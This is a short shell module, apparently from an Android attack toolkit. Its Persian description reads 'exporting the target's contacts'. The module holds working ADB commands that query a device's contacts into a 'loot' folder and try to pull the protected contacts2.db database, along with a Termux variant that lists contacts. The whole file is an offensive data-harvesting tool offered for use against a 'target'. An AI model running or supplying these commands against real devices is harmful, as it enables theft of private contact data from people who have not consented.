DESC="خروجی گرفتن از مخاطبین هدف"
REQ="ADB"
RISK="LOW"

termux(){
cat <<'EOF'
termux-contact-list | jq -r '.[] | "\(.name) \(.number)"'
EOF
}

kali(){
cat <<'EOF'
mkdir -p loot
adb shell content query --uri content://com.android.contacts/contacts \
  --projection display_name:number > loot/contacts.txt
adb pull /data/data/com.android.providers.contacts/databases/contacts2.db loot/ 2>/dev/null
grep -o 'display_name=[^,]*' loot/contacts.txt | head -50
EOF
}
